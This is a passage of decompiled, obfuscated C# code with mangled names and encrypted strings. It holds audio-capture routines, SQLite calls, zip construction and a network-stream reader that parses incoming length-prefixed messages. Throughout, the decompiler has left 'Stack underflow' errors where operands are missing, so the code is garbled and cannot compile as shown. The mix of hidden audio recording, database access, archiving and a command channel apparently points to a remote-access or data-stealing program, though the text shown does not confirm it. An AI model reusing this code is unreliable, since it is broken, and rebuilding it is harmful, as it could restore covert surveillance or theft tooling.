				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 2
				_ = ((MediaFoundationEncoder._0002)/*Error near IL_0009: Stack underflow*/)._0001;
				int num = ((MediaType)/*Error near IL_0010: Stack underflow*/).AverageBytesPerSecond;
				int delta = Math.Abs(/*Error near IL_0013: Stack underflow*/ - num * 8);
				return new
				{
					MediaType = (MediaType)/*Error near IL_001d: Stack underflow*/,
					Delta = delta
				};
			}).OrderBy(_0002 =>
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_003C_003Ef__AnonymousType0<MediaType, int>)/*Error near IL_000d: Stack underflow*/).Delta;
				return (int)/*Error near IL_0005: Stack underflow*/;
			}).Select(_0002 =>
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_003C_003Ef__AnonymousType0<MediaType, int>)/*Error near IL_000d: Stack underflow*/).MediaType;
				return (MediaType)/*Error near IL_0005: Stack underflow*/;
			})
				.FirstOrDefault();
		}

		static void _0001(global::_0014._0008 P_0)
		{
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((global::_0014._0008)/*Error near IL_000c: Stack underflow*/)._0002;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0045: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				_0018._0001(_0018._0001(((global::_0014._0008)/*Error near IL_001c: Stack underflow*/)._0002, 0), _0080._0014._0001(107349341));
				P_0._0002 = IntPtr.Zero;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(Exception _0002, _0019._0005 P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new _0019._0005._0001();
			_0019._0005._0001 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (_0019._0005._0001)/*Error near IL_006f: Stack underflow*/;
			}
			((_0019._0005._0001)/*Error near IL_000e: Stack underflow*/)._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (P_1._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(P_1, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(P_1._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0019._0005._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0019._0005._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0019._0005._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		static void _0001(global::_0016._0014 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			((global::_0016._0014)/*Error near IL_0007: Stack underflow*/)._0001.Clear();
		}

		[DllImport("msacm32.dll", EntryPoint = "acmDriverRemove")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		static void _0001(global::_0007._0014 _0002, _007F._0014 P_1)
		{
			//IL_00ad: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 1
			_ = ((global::_0007._0014)/*Error near IL_00b7: Stack underflow*/).BufferSize;
			int num = (int)/*Error near IL_00bd: Stack underflow*/;
			long num2 = (long)(10000000.0 * (double)num / (double)P_1._0001._0001);
			int num3 = (int)(num2 / 10000 / 2);
			int num4 = (int)(3 * num2 / 10000);
			global::_0015._0012 obj = _0002.AudioCaptureClient;
			_0018._0001(_0002);
			P_1._0001 = _001F._0014._0003;
			while (P_1._0001 == _001F._0014._0003)
			{
				bool flag = true;
				if (P_1._0002)
				{
					flag = _0084_0006._007E_001A_0010(P_1._0001, num4, false);
				}
				else
				{
					global::_0007._0096(num3);
				}
				if (P_1._0001 == _001F._0014._0003)
				{
					if (flag)
					{
						_0018._0001(P_1, obj);
					}
					continue;
				}
				break;
			}
		}

		static DateTime _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (P_1._0001[_0002]._0001 != null)
			{
				return _0086_0006._007E_001B_0010(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			throw new InvalidCastException();
		}

		static void _0001(int _0002, global::_0017._0015 _0003, IntPtr P_2)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001c: Stack underflow*/(pUnknown, _0002, P_2);
			string text = _0080._0014._0001(107349288);
			_0018._0001((global::_0017._0015)/*Error near IL_002b: Stack underflow*/, num, text);
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0087: Incompatible stack heights: 0 vs 3
			//IL_008e: Incompatible stack heights: 0 vs 3
			try
			{
				_000E_0005._0094_000E(global::_0015._0001._001A);
				if (((Array)/*Error near IL_000f: Stack underflow*/).Length == 0)
				{
					_ = global::_001C._0097_0003;
					_ = global::_0011._008E_0002;
					_0018._0001();
					_ = global::_0015._0001._001A;
					_ = global::_0002._007E_0006;
					_0080._0014._0001(107362089);
					string text = /*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/);
					string text2 = /*Error near IL_0038: Stack underflow*/((string)/*Error near IL_0038: Stack underflow*/, (string)/*Error near IL_0038: Stack underflow*/, text);
					if (/*Error near IL_003d: Stack underflow*/(text2))
					{
						_0018._0001(P_0, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._001A, global::_0002._007E_0006(_0080._0014._0001(107362089))));
					}
				}
			}
			catch
			{
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_000E._0019._0001 P_0)
		{
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = new double[256, 4];
			((global::_000E._0019._0001)/*Error near IL_000f: Stack underflow*/)._0001 = (double[,])/*Error near IL_000f: Stack underflow*/;
		}

		static void _0001()
		{
			//IL_002b: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0017._0084._0001;
			/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
			try
			{
				global::_0017._0084._000E = null;
				global::_0017._0084._0002 = false;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static _0080._0017 _0001(global::_0017._0080 P_0)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0031: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107349311));
			}
			return P_0._0001._0004();
		}

		static global::_0014._0008 _0001(string _0002)
		{
			//IL_00e9: Incompatible stack heights: 0 vs 1
			//IL_00f3: Incompatible stack heights: 0 vs 1
			_0018._0001((string)/*Error near IL_00f3: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_00f9: Stack underflow*/;
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new ArgumentException(_0080._0014._0001(107348682));
			}
			IntPtr intPtr2 = _0018._0001(intPtr, _0080._0014._0001(107348645));
			if (_0090_0002._009A_0005(intPtr2, IntPtr.Zero))
			{
				_0018._0001(intPtr);
				throw new ArgumentException(_0080._0014._0001(107348660));
			}
			IntPtr intPtr3;
			MmResult mmResult = _0018._0001(out intPtr3, intPtr, intPtr2, 0, global::_0014._0007._0003);
			if (mmResult != 0)
			{
				_0018._0001(intPtr);
				throw new global::_0013._0001(mmResult, _0080._0014._0001(107348587));
			}
			global::_0014._0008 obj = new global::_0014._0008(intPtr3);
			if (global::_001C._0096_0003(obj._0001._0002))
			{
				obj._0001._0002 = global::_000F._008B_0002(_0080._0014._0001(107348602), global::_001E._009D_0003(_0002));
				obj._0003 = intPtr;
			}
			return obj;
		}

		static void _0001(int _0002, byte[] _0003, int _0004, global::_0004._0016 P_3)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0004._0016)/*Error near IL_003c: Stack underflow*/);
			_0018._0001((global::_0004._0016)/*Error near IL_000b: Stack underflow*/);
			_0018._0001(_0002, _0003, _0004, P_3);
			_0080._0017 obj = _0018._0001(global::_0010._0080._0001(P_3._0001), _0003, _0004, _0002);
			if (obj != 0)
			{
				throw new SQLiteException(obj, null);
			}
		}

		static double _0001(IntPtr _0002, int _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 3
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			_ = _0015_0003._0091_0006;
			_ = _001F_0005._000E_000F;
			/*Error near IL_0021: Stack underflow*/((IntPtr)/*Error near IL_0021: Stack underflow*/, (int)/*Error near IL_0021: Stack underflow*/);
			return /*Error near IL_0015: Stack underflow*/((long)/*Error near IL_0015: Stack underflow*/);
		}

		static string _0001(object _0002)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			if (/*Error near IL_0003: Stack underflow*/ is string)
			{
				return (string)/*Error near IL_000c: Stack underflow*/;
			}
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return global::_0002._007E_0006(_0002);
			}
			return null;
		}

		static string _0001(_001A._0018 P_0)
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0038: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return null;
			}
			int num = 0;
			IntPtr intPtr2 = _0018._0001(P_0._0001, ref num);
			return _0018._0001(num, intPtr2);
		}

		[DllImport("winmm.dll", EntryPoint = "midiInMessage")]
		static extern MmResult _0001(IntPtr _0002, int _0003, IntPtr _0004, IntPtr _0005);

		[DllImport("winmm.dll", EntryPoint = "waveInOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, global::_0005._0005 _0004, global::_0017._0008._0003 _0005, IntPtr _0006, global::_0017._0008._0001 _0007);

		static float _0001(int _0002, global::_0018._0004 P_1)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected I4, but got Unknown
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ < 0)
			{
				int num = ((global::_0018._0004)/*Error near IL_000e: Stack underflow*/)._0001;
				_0002 = /*Error near IL_000f: Stack underflow*/+ num;
			}
			if ((_0002 >= 0) & (_0002 < P_1._0001.Count))
			{
				return P_1._0001[_0002];
			}
			return 0f;
		}

		static void _0001(double _0002, double _0003, global::_000E._0019 P_2)
		{
			//IL_000b: Invalid comparison between Unknown and F8
			//IL_0023: Invalid comparison between Unknown and F8
			//IL_0038: Invalid comparison between Unknown and F8
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 1
			if (!((double)/*Error near IL_000d: Stack underflow*/ >= 1.0))
			{
				_0002 = 1.0;
			}
			if (!((double)/*Error near IL_0025: Stack underflow*/ >= 1.0))
			{
				_0003 = 1.0;
			}
			double num = P_2._0002;
			if ((double)/*Error near IL_003a: Stack underflow*/ != num || _0003 != P_2._0003)
			{
				P_2._0002 = _0002;
				P_2._0003 = _0003;
				P_2._0005 = P_2._0002 / P_2._0003;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(float _0002, global::_0007._0006 _0003, float P_2)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 2
			_ = ((global::_0007._0006)/*Error near IL_0007: Stack underflow*/)._0001;
			((global::_0016._0008)/*Error near IL_0035: Stack underflow*/).Left = (float)/*Error near IL_0035: Stack underflow*/;
			_0003._0001.Right = P_2;
			_0003._0001(_0003, _0003._0001);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string[] _0001(global::_0008._0001 P_0)
		{
			//IL_011b: Incompatible stack heights: 0 vs 1
			//IL_0121: Incompatible stack heights: 0 vs 1
			try
			{
				byte[] array = new byte[5];
				NetworkStream networkStream = _0018._0001(((global::_0008._0001)/*Error near IL_001c: Stack underflow*/)._0001, P_0._0001);
				((global::_0008._0001)/*Error near IL_002c: Stack underflow*/)._0001 = networkStream;
				_0082._007E_0006_0004(P_0._0001, array, 0, 5);
				int num = _0002_0006._0095_000F(array, 0);
				byte[] array2 = new byte[num];
				int num2 = 0;
				int num3 = num;
				while (num3 > 0)
				{
					int num4 = ((num3 > P_0._0003) ? P_0._0003 : num3);
					int num5 = _0082._007E_0006_0004(P_0._0001, array2, num2, num4);
					num2 += num5;
					num3 -= num5;
				}
				string text = global::_0002._007E_0006(_0084_0002._007E_008D_0005(_0082_0002._0088_0005(), array2, 0, num));
				if (_0010_0003._008B_0006(global::_0002._007E_000F(text), _0080._0014._0001(107396634)))
				{
					return null;
				}
				return global::_000E._007E_008A_0002(global::_0002._007E_0008(text), new char[1] { '=' });
			}
			catch (Exception)
			{
				P_0._0007 = false;
				return null;
			}
		}

		static void _0001(global::_0010._0019 P_0)
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_0010._0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(ref global::_0010._0019._0004, _001F._0017._0019, IntPtr.Zero, out var obj);
			/*Error near IL_003f: Stack underflow*/((int)/*Error near IL_003f: Stack underflow*/);
			P_0._0001 = new global::_0017._001B(obj as global::_0007._0016);
		}

		static void _0001(global::_0002._0002 P_0)
		{
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0002._0002)/*Error near IL_004d: Stack underflow*/);
			((global::_0002._0002)/*Error near IL_000b: Stack underflow*/)._0001 = (string)/*Error near IL_000b: Stack underflow*/;
			P_0._0001 = _008A_0002._007E_0093_0005(P_0._0001);
			P_0._0001 = global::_0012._007E_0091_0002(_0005_0003._007E_0082_0006(P_0._0001));
		}

		static int _0001(_0019._0010 _0002, byte[] _0003, int _0004, int P_3)
		{
			//IL_00e0: Incompatible stack heights: 0 vs 1
			//IL_00ec: Incompatible stack heights: 0 vs 2
			object obj = ((_0019._0010)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				if (P_3 > _0002._0003)
				{
					P_3 = _0002._0003;
				}
				int num = 0;
				int num2 = _0016_0002._0018_0005(_0002._0001.Length - _0002._0002, P_3);
				_0099_0002._0010_0006(_0002._0001, _0002._0002, _0003, _0004, num2);
				num += num2;
				_0002._0002 += num2;
				_0002._0002 %= _0002._0001.Length;
				if (num < P_3)
				{
					_0099_0002._0010_0006(_0002._0001, _0002._0002, _0003, _0004 + num, P_3 - num);
					_0002._0002 += P_3 - num;
					num = P_3;
				}
				_0002._0003 -= num;
				return num;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static int _0001(global::_0017._007F._0002 _0002, byte[] _0003, int _0004, int P_3)
		{
			//IL_00d3: Incompatible stack heights: 0 vs 1
			//IL_00da: Incompatible stack heights: 0 vs 1
			int num = 0;
			while (_0002._0003 > 0 && P_3 > 0)
			{
				_0004++;
				uint num2 = _0002._0001;
				((sbyte[])/*Error near IL_001e: Stack underflow*/)[/*Error near IL_001e: Stack underflow*/] = (sbyte)(byte)num2;
				_0002._0001 >>= 8;
				_0002._0003 -= 8;
				P_3--;
				num++;
			}
			if (P_3 == 0)
			{
				return num;
			}
			int num3 = _0002._0002 - _0002._0001;
			if (P_3 > num3)
			{
				P_3 = num3;
			}
			Array.Copy(_0002._0001, _0002._0001, _0003, _0004, P_3);
			_0002._0001 += P_3;
			if (((uint)(_0002._0001 - _0002._0002) & (true ? 1u : 0u)) != 0)
			{
				_0002._0001 = _0002._0001[_0002._0001++] & 0xFFu;
				_0002._0003 = 8;
			}
			return num + P_3;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_001F._0019 _0002, DataTable P_1)
		{
			//IL_03b5: Incompatible stack heights: 0 vs 1
			_001F._0019._0003 obj = null;
			for (int i = 0; i < _0002._0001.Length; i++)
			{
				if (((_001F._0019)/*Error near IL_001b: Stack underflow*/)._0001[i]._0001 != null && _0002._0001[i]._0001 == obj)
				{
					continue;
				}
				obj = _0002._0001[i]._0001;
				if (obj == null)
				{
					DataRow dataRow = _0005_0005._007E_008E_000E(P_1);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnName, _0002._0001[i]._0003);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnOrdinal, global::_001A._007E_001E_0003(_0006_0005._007E_008F_000E(P_1)));
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnSize, 8);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.NumericPrecision, 255);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.NumericScale, 255);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ProviderType, DbType.Int64);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsLong, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.AllowDBNull, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsReadOnly, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsRowVersion, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsUnique, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsKey, true);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.DataType, _0091._0080_0004(typeof(long).TypeHandle));
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsHidden, true);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.BaseColumnName, _0002._0001[i]._0003);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsExpression, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsAliased, false);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.BaseTableName, _0002._0001[i]._0002);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName, _0002._0001[i]._0001);
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsAutoIncrement, true);
					_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107359181), _0080._0014._0001(107358440));
					_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(P_1), dataRow);
					continue;
				}
				_0018._0001(obj, 0L);
				DataTable dataTable = _0014_0004._007E_001D_0008(obj._0001);
				try
				{
					IEnumerator enumerator = _0014_0005._007E_009B_000E(_0006_0005._007E_008F_000E(dataTable));
					try
					{
						while (global::_001B._007E_0086_0003(enumerator))
						{
							DataRow dataRow2 = (DataRow)_0083_0003._007E_001D_0007(enumerator);
							object[] array = _0087_0006._007E_001C_0010(dataRow2);
							DataRow dataRow3 = _0088_0006._007E_001D_0010(_0006_0005._007E_008F_000E(P_1), array);
							_0083_0004._007E_0093_0008(dataRow3, SchemaTableOptionalColumn.IsHidden, true);
							_0083_0004._007E_0093_0008(dataRow3, SchemaTableColumn.ColumnOrdinal, global::_001A._007E_001E_0003(_0006_0005._007E_008F_000E(P_1)) - 1);
						}
					}
					finally
					{
						if (enumerator is IDisposable disposable)
						{
							global::_0008._007E_0098(disposable);
						}
					}
				}
				finally
				{
					if (dataTable != null)
					{
						global::_0008._007E_0098(dataTable);
					}
				}
			}
		}

		static int _0001(global::_0017._0080 P_0)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0025: Stack underflow*/);
			int result = -1;
			if (P_0._0001 != null)
			{
				result = P_0._0001._0001();
			}
			return result;
		}

		static int _0001(int _0002, byte[] _0003, global::_0017._007F._0001 _0004, int P_3)
		{
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			int num = 0;
			do
			{
				if (((global::_0017._007F._0001)/*Error near IL_000a: Stack underflow*/)._0013 != 11)
				{
					int num2 = P_3;
					global::_0017._007F._0003 obj = _0004._0001;
					int num3 = _0018._0001((int)/*Error near IL_001d: Stack underflow*/, num2, _0003, obj);
					P_3 += num3;
					num += num3;
					_0002 -= num3;
					if (_0002 == 0)
					{
						return num;
					}
				}
			}
			while (_0018._0001(_0004) || (_0004._0001._0004 > 0 && _0004._0013 != 11));
			return num;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_double")]
		static extern void _0001(IntPtr _0002, double _0003);

		[DllImport("mfplat.dll", EntryPoint = "MFCreateMediaType", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001(out _0019._0012 _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static bool _0001(global::_0001._001D _0002, [Out] DbType _0003, ref global::_0006._0018 P_2)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if (((global::_0001._001D)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				*(@null*)(nint)/*Error near IL_000d: Stack underflow*/ = null;
				return false;
			}
			return ((global::_0001._001D)/*Error near IL_0016: Stack underflow*/)._0001.TryGetValue(_0003, out P_2);
		}

		static void _0001(global::_0015._0008 _0002, long P_1)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected I8, but got Unknown
			//IL_007b: Incompatible stack heights: 0 vs 3
			//IL_007e: Incompatible stack heights: 0 vs 2
			//IL_0085: Incompatible stack heights: 0 vs 2
			_ = _009A._008F_0004;
			_ = 10000000;
			long num = ((global::_0015._0008)/*Error near IL_0012: Stack underflow*/)._0003;
			_ = /*Error near IL_0013: Stack underflow*/* num;
			int num2 = ((global::_0015._0008)/*Error near IL_001a: Stack underflow*/)._0001._0002;
			Marshal.SizeOf((object)_0019._001A._0001(/*Error near IL_0021: Stack underflow*/ / num2));
			IntPtr intPtr = Marshal.AllocHGlobal((int)/*Error near IL_0033: Stack underflow*/);
			object obj = (_0019._001A)/*Error near IL_0039: Stack underflow*/;
			/*Error near IL_0040: Stack underflow*/(obj, intPtr, false);
			_0002._0001._0001(Guid.Empty, intPtr);
			_009B._0090_0004(intPtr);
			_0002._0002 = 0;
			_0002._0001 = 0;
			_0002._0002 = P_1;
			_0002._0003 = -1L;
		}

		[DllImport("winmm.dll", EntryPoint = "midiInStart")]
		static extern MmResult _0001(IntPtr _0002);

		static global::_000E._000E _0001()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			new global::_000E._000E(_001B._0007._0001, IntPtr.Zero);
			return (global::_000E._000E)/*Error near IL_0009: Stack underflow*/;
		}

		static byte[] _0001(int _0002, byte[] _0003, byte[] _0004, byte[] _0005)
		{
			//IL_0471: Incompatible stack heights: 0 vs 1
			//IL_047d: Incompatible stack heights: 0 vs 1
			try
			{
				new global::_0017._007F._000F();
				global::_0017._007F._000F obj = (global::_0017._007F._000F)/*Error near IL_0477: Stack underflow*/;
				if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
				{
					global::_0017._007F._0006 obj2 = new global::_0017._007F._0006();
					DateTime now = DateTime.Now;
					long num = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
					uint[] array = new uint[256]
					{
						0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
						3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
						450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
						4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
						901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
						3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
						795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
						2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
						1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
						2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
						1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
						2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
						1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
						62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
						3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
						426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
						3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
						906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
						3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
